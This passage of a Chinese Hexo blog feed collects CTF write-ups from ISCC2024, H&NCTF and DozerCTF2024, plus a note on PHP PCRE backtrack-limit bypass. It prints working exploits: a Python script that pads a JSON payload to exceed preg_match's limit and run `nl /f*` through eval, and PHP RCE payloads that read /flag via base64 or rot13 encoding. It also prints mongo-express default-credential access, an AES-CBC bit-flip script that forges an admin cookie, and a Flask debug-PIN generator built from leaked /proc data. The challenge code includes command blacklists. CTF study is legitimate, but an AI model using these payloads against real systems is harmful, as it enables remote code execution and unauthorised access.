class="hljs-string">b&#x27;&#x27;</span><br>        prev_block = self.IV<br>        <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> blocks:<br>            output = self._encrypt_block(prev_block)<br>            plaintext_block = self._xor(output, block)<br>            plaintext += plaintext_block<br>            prev_block = block<br>        <span class="hljs-keyword">return</span> plaintext<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self, ciphertext</span>):<br>        block_size_bytes = self.BLOCK_SIZE // <span class="hljs-number">8</span><br>        blocks = [ciphertext[i:i + block_size_bytes] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ciphertext), block_size_bytes)]<br><br>        <span class="hljs-keyword">if</span> self.mode == Mode.ECB:<br>            plaintext = self._decrypt_ecb(blocks)<br>        <span class="hljs-keyword">elif</span> self.mode == Mode.CBC:<br>            plaintext = self._decrypt_cbc(blocks)<br><br></code></pre></td></tr></table></figure><p><img src="/../../images/iscc2024/yyds8.png" alt="yyds8"></p><p>一共得到四个部分拼接起来看看可能是栅栏，我们用在线枚举得到答案</p><p><img src="/../../images/iscc2024/yyds9.png" alt="yyds9"></p><h3 id="实战阶段一"><a href="#实战阶段一" class="headerlink" title="实战阶段一"></a>实战阶段一</h3><p>这个cve漏洞完全跟着网上一篇文章来就可以成功了，，也说一下</p><p><a href="https://www.cnblogs.com/arrest/articles/17529877.html">文章</a>，跟着来就行了</p><p><img src="/../../images/iscc2024/%E5%AE%9E%E6%88%98.png" alt="实战"></p><p>先尝试看看flag里面有没有内容，然后注意到了cve漏洞，去具体搜索一下看看</p><p>mongo-express是一款mongodb的第三方Web界面，使用node和express开发。如果攻击者可以成功登<br>录，或者目标服务器没有修改默认的账号密码（ admin:pass ），则可以执行任意node.js代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Authorization: Basic YWRtaW46cGFzcw==<br></code></pre></td></tr></table></figure><p>改个success+账户名就行</p><p><img src="/../../images/iscc2024/%E5%AE%9E%E6%88%981.png" alt="实战1"></p><p>总结：虽然是炒冷饭，还是记录一下吧，没什么好说的，人民的好比赛。（劳累.jpg</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>复盘</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP利用PCRE回溯次数限制绕过</title>
    <link href="/2024/05/14/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/"/>
    <url>/2024/05/14/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/PHP%E5%88%A9%E7%94%A8PCRE%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>刷题碰到了这种题目，记录一下知识点。</p><p>首先可以拜读一下p神的文章，还是很有收获的。</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html?page=2#reply-list">文章</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>然后我也简要的说一下吧。</p><p>常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是</p><ul><li><p>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入。</p></li><li><p>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</p></li></ul><p>就以p神举的例子，我们正则&lt;?.*[(&#96;;?&gt;].*,然后输入&lt;?php phpinfo();&#x2F;&#x2F;aaaaa这个内容</p><p>由于有.*这个正则，可以匹配任何字符，进行贪婪模式，匹配到.*时，会把php phpinfo();&#x2F;&#x2F;aaaaa所有进行匹配，但是应该不对后面应该还有一个字符[(&#96;;?&gt;]（这是一个字符集匹配其中任意一个，所有我们会进行回溯，吐出a,最终直道吐出；然后可以进行匹配。这个结果满足正则表达式的要求，于是不再回溯。最后的.*匹配的&#x2F;&#x2F;aaaaa，完成正则。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>preg_match本身回身回溯超过1000000会返回false绕过，我们可以构造脚本进行绕过。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>是先看到的题目，然后才开始找知识点的。<a href="https://www.nssctf.cn/problem/1897">NISACTF 2022middlerce</a>。</p><p>先看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>include &quot;check.php&quot;;<br>if (isset($_REQUEST[&#x27;letter&#x27;]))&#123;<br>    $txw4ever = $_REQUEST[&#x27;letter&#x27;];<br>    if (preg_match(&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;,$txw4ever))&#123;<br>        die(&quot;再加把油喔&quot;);<br>    &#125;<br>    else&#123;<br>        $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;];<br>        checkdata($command);<br>        @eval($command);<br>    &#125;<br>&#125;<br>else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>我们只分析这篇的知识点，和上面讲的差不多，cmd绕过后eval进行读取</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>payload=<span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `nl /f*`?&gt;&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;@&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><span class="hljs-comment">#传的letter,构造payload里面的内容，?&gt;是绕过checkdata,然后js选择cmd里的内容执行代码输出</span><br>res = requests.post(<span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28304/&quot;</span>, data=&#123;<span class="hljs-string">&quot;letter&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="感受："><a href="#感受：" class="headerlink" title="感受："></a>感受：</h2><p>小白学到知识还是感受良多的，之后如果遇到类似的题目也会继续加在这里。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>H&amp;NCTF</title>
    <link href="/2024/05/13/H&amp;NCTF%202024/"/>
    <url>/2024/05/13/H&amp;NCTF%202024/</url>
    
    <content type="html"><![CDATA[<p>前言：比赛也没怎么打，就看了看，自己会的还是太少了，等师傅们发完wp想看看复现一遍的，先写写记录一下知识。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><p>***知识点:***rce绕过-编码绕过</p><p>先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;moran&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>];<br>        <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="hljs-variable">$str1</span>) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str2</span>) != <span class="hljs-number">19</span> || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="hljs-variable">$str2</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;task&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p><em><strong>分析：</strong></em>post传入两个值，task正则绕过，flag大小写绕过</p><p>​然后replace，意思就是执行task传入的内容。</p><p><em><strong>解题：</strong></em>首先构造flag，我们随便改个大小写就行，<code>please_give_me_flaG</code>,然后看task，常用的rce函数都被禁用了，我尝试了scandir读取内容失败了，学习了一会，可以先base64加密再解密得到想要的&#x2F;flag，</p><p>payload:<code>task=var_dump(readfile(base64_decode(&quot;L2ZsYWc=&quot;)))&amp;flag=please_give_me_flaG</code></p><p><img src="/../images/H&NCTF/rce.png" alt="rce"></p><p>也可以用rot-13解密，<code>task=var_dump(readfile(str_rot13(&quot;/synt&quot;)))&amp;flag=please_give_me_flaG</code></p><p>这样也是可以的，可以多尝试看看。（回头看了一下其他师傅的知识点，其实有许多绕过的方法</p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><p><em><strong>知识点：</strong></em>提示看hint，可以给到源码，放一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, abort<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode, b64decode<br><br><span class="hljs-keyword">import</span> json<br><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><br>key = get_random_bytes(AES.block_size)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">session</span>):<br>    iv = get_random_bytes(AES.block_size)<br>    cipher = AES.new(key, AES.MODE_CBC, iv)<br>    <span class="hljs-keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), AES.block_size)))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">session</span>):<br>    raw = b64decode(session)<br>    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])<br>    <span class="hljs-keyword">try</span>:<br>        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br>app = Flask(__name__)<br><br>filename_blacklist = &#123;<br>    <span class="hljs-string">&#x27;self&#x27;</span>,<br>    <span class="hljs-string">&#x27;cgroup&#x27;</span>,<br>    <span class="hljs-string">&#x27;mountinfo&#x27;</span>,<br>    <span class="hljs-string">&#x27;env&#x27;</span>,<br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>&#125;<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<br>            <span class="hljs-string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session).decode())<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;have a fun&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/hint&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hint</span>():<br>    res = Response(<span class="hljs-built_in">open</span>(__file__).read(), mimetype=<span class="hljs-string">&#x27;text/plain&#x27;</span>)<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/read&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>():<br><br>    session = request.cookies.get(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    <span class="hljs-keyword">if</span> session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        res = Response(<span class="hljs-string">&quot;you are not logged in&quot;</span>)<br>        res.set_cookie(<span class="hljs-string">&#x27;session&#x27;</span>, encrypt(default_session))<br>        <span class="hljs-keyword">return</span> res<br>    <span class="hljs-keyword">else</span>:<br>        plain_session = decrypt(session)<br>        <span class="hljs-keyword">if</span> plain_session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;don\&#x27;t hack me&#x27;</span><br><br>        session_data = json.loads(plain_session)<br><br>        <span class="hljs-keyword">if</span> session_data[<span class="hljs-string">&#x27;admin&#x27;</span>] :<br>            filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(blacklist_str <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">for</span> blacklist_str <span class="hljs-keyword">in</span> filename_blacklist):<br>                abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">&#x27;Access to this file is forbidden.&#x27;</span>)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">return</span> f.read()<br>            <span class="hljs-keyword">except</span> FileNotFoundError:<br>                abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">&#x27;File not found.&#x27;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">f&#x27;An error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are not an administrator&#x27;</span><br><br><br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">9091</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>先审计一下代码</p><p><img src="/../images/H&NCTF/flipPin.png" alt="flipPin"></p><p>是AES-CBC字节反转攻击，</p><p>该方面的信息也是不太懂，搜索了一下内容如下</p><p>Flask在debug模式下会生成一个Debugger PIN，而且如果你多次重启Flask服务，PIN码值不改变。</p><p>通常情况下，对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在**&#x2F;etc&#x2F;machine-id<strong>或</strong>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id**，有的系统没有这两个文件，windows的id获取跟linux也不同。<br>对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup：</p><p>也是借用一下师傅的代码吧，我自己也不会写（之后准备系统学一下相关知识</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode, b64encode<br><br>url = <span class="hljs-string">&quot;http://hnctf.imxbt.cn:34024/&quot;</span><br>default_session = <span class="hljs-string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span><span class="hljs-comment">#源代码给的非管理员用户信息</span><br>res = requests.get(url)<span class="hljs-comment">#发送了一个 GET 请求到目标网站，用于获取一个默认的加密会话。</span><br>c = <span class="hljs-built_in">bytearray</span>(b64decode(res.cookies[<span class="hljs-string">&quot;session&quot;</span>]))<br>c[default_session.index(<span class="hljs-string">&quot;0&quot;</span>)] ^= <span class="hljs-number">1</span><span class="hljs-comment">#session从0改为1</span><br>evil = b64encode(c).decode()<br><br>res = requests.get(url+<span class="hljs-string">f&quot;read?filename=/proc/sys/kernel/random/boot_id&quot;</span>, cookies=&#123;<span class="hljs-string">&quot;session&quot;</span>: evil&#125;)<br><span class="hljs-comment">#</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sha1</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;ctfUser&#x27;</span><span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># 报错得到</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;226622582027708&#x27;</span>,<span class="hljs-comment">#  /sys/class/net/eth0/address 16进制转10进制</span><br>    <span class="hljs-comment">#machine_id由两个合并(docker就后两个)：1./proc/sys/kernel/random/boot_id      2./proc/self/cgroup 由于cgroup和mountinfo被禁用,则用/proc/1/cpuset代替读取</span><br>    <span class="hljs-string">&#x27;dd0fe358-1d2b-4bb4-90d1-5fee6bcf533f&#x27;</span>+<span class="hljs-string">&#x27;51b9b7cd533a81e6baec0204f59b346b6558a68bed89cfda595ad4a35cc46a39&#x27;</span><span class="hljs-comment">#  /proc/sys/kernel/random/boot_id + /proc/1/cpuset</span><br>]<br><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv =<span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><br><span class="hljs-built_in">print</span>(rv)<br></code></pre></td></tr></table></figure><p>得到pin，在console里面输入pin</p><p><img src="/../images/H&NCTF/console.png" alt="console"></p><p>大部分都是借鉴的，之后会系统的学一下。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DozerCTF2024</title>
    <link href="/2024/04/28/Dozerctf/Dozerctf2024/"/>
    <url>/2024/04/28/Dozerctf/Dozerctf2024/</url>
    
    <content type="html"><![CDATA[<p>前言：历时一天，最后拿到了团队第八，以下是团队的wp.</p><h1 id="web-and-misc"><a href="#web-and-misc" class="headerlink" title="web and misc"></a>web and misc</h1><h2 id="easy-rce"><a href="#easy-rce" class="headerlink" title="easy_rce"></a>easy_rce</h2><p>先上源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment"># 简简单单签个到吧</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$poc</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;/[0-9]|get_defined_vars|include|readfile|crypt|require|file_get_contents|readgzfile|highlight_file|show|session|getallheaders|next|prev|end|array_reverse|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$blacklist</span>, <span class="hljs-variable">$poc</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;die!&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;dieeeeeeee&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$poc</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span 